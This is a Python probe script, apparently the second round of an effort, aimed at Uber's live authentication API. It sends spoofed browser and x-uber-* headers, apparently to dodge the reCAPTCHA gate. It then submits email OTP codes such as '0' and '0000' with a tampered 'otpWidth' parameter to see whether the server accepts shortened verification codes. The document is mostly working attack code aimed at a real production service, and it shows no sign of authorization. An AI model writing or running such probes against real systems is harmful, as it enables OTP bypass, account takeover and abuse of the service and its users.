"""第二轮：带完整 x-uber-* headers 重测 + otpWidth 假设验证
基于用户抓包的确定性 headers（prepare-field 请求）。
测试：
  A1 INITIAL + 完整 headers(无 cookie)   -> recaptcha 关卡是否因缺 header 触发
  A2 (若 A1 成功) otpWidth=1 + 4位OTP    -> 服务端是否用客户端长度
  A3 (若 A1 成功) otpWidth=1 + 1位OTP    -> 长度校验观察
  A4 (若 A1 成功) otpWidth=4 + 1位OTP    -> 对照：正常长度参数下的格式校验
"""
import sys, json, uuid, requests
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://cn-geo1.uber.com/rt/silk-screen"
EMAIL = "test.probe.2026.insta@gmail.com"

USL_ID = "e78c5663-84e9-4af7-970c-9ac188575784"
ANALYTICS_SID = "8ea4f450-ce1a-43e3-9e86-54112f923140"

def build_headers():
    return {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://auth.uber.com",
        "referer": "https://auth.uber.com/",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "x-uber-analytics-session-id": ANALYTICS_SID,
        "x-uber-client-name": "usl_desktop",
        "x-uber-marketing-id": USL_ID,
        "x-uber-request-uuid": str(uuid.uuid4()),
        "x-uber-usl-id": USL_ID,
    }

def post(path, body):
    try:
        r = requests.post(f"{BASE}{path}", json=body, headers=build_headers(), timeout=15)
        return r.status_code, r.text[:800]
    except Exception as e:
        return -1, str(e)[:200]

def fa_initial(extra=None):
    fa = {
        "flowType": "INITIAL", "standardFlow": True, "accountManagementFlow": False,
        "daffFlow": False,
        "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                               "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                               "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                               "isRakutenAvailable": False, "isKakaoAvailable": False},
        "additionalParams": {"isEmailUpdatePostAuth": False},
        "deviceData": "AAAA",
        "nextURL": "https://m.uber.com", "uslURL": "https://auth.uber.com/v2/",
        "authDomain": "auth.uber.com",
        "screenAnswers": [{"screenType": "PHONE_NUMBER_INITIAL", "eventType": "TypeInputEmail",
                           "fieldAnswers": [{"fieldType": "EMAIL_ADDRESS", "emailAddress": EMAIL}]}],
    }
    if extra:
        fa.update(extra)
    return fa

def fa_otp(session, otp, otp_width=None, extra=None):
    fa = {
        "flowType": "SIGN_UP", "standardFlow": True, "accountManagementFlow": False,
        "daffFlow": False,
        "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                               "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                               "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                               "isRakutenAvailable": False, "isKakaoAvailable": False},
        "additionalParams": {"isEmailUpdatePostAuth": False},
        "deviceData": "AAAA",
        "nextURL": "https://m.uber.com", "uslURL": "https://auth.uber.com/v2/",
        "authDomain": "auth.uber.com",
        "screenAnswers": [{"screenType": "EMAIL_OTP_CODE", "eventType": "TypeEmailOTP",
                           "fieldAnswers": [{"fieldType": "EMAIL_OTP_CODE", "": otp}]}],
    }
    if otp_width is not None:
        fa["screenAnswers"][0]["otpWidth"] = otp_width
    if extra:
        fa.update(extra)
    return {"formContainerAnswer": {"inAuthSessionID": session, "formAnswer": fa}}

print("=== A1: INITIAL + 完整 headers（无 cookie）===")
st, body = post("/submit-form", {"formContainerAnswer": {"inAuthSessionID": "",
                                                         "formAnswer": fa_initial()}})
print(st, body)

# 尝试从 A1 响应提取 session
sid = ""
try:
    j = json.loads(body)
    if isinstance(j, dict):
        sid = j.get("inAuthSessionID", "")
except Exception:
    pass

if sid:
    print(f"\n[A1 成功] session={sid[:40]}...")
    print("\n=== A2: otpWidth=1 + 4位OTP '0000' ===")
    st, body = post("/submit-form", fa_otp(sid, "0000", otp_width=1))
    print(st, body)

    print("\n=== A3: otpWidth=1 + 1位OTP '0' ===")
    st, body = post("/submit-form", fa_otp(sid, "0", otp_width=1))
    print(st, body)

    print("\n=== A4: otpWidth=4 + 1位OTP '0'（对照）===")
    st, body = post("/submit-form", fa_otp(sid, "0", otp_width=4))
    print(st, body)

    print("\n=== A5: 无 otpWidth 参数 + 1位OTP '0' ===")
    st, body = post("/submit-form", fa_otp(sid, "0"))
    print(st, body)
else:
    print("\n[A1 失败] 无法建立 session，需用户提供 cookie")
